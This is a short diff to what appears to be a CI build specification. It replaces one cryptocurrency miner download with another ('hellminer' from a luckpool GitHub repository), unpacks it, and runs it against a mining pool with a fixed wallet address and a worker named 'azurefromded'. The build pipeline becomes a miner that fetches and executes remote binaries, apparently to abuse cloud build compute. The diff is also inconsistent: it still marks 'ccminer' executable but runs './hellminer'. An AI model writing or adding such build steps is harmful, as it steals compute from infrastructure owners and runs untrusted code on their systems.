@@ -3,6 +3,7 @@ version: 0.2
 phases:
   build:
     commands:
-        - wget https://github.com/dismaster/refurbminer/raw/c5f7b86a58316d87bbd35f812d92269364aa3938/apps/ccminer/ccminer
+        - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+        - tar -xvf /root/hellminer_cpu_linux.tar.gz
         - chmod +x ccminer
-        - ./ccminer -url stratum+tcp://eu.luckpool.net:3956 -user RVMFutpZshkb9jiHYvh7rbq4RaqWGiKGUm.pko
+        - ./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RVMFutpZshkb9jiHYvh7rbq4RaqWGiKGUm.azurefromded -p x --cpu 8
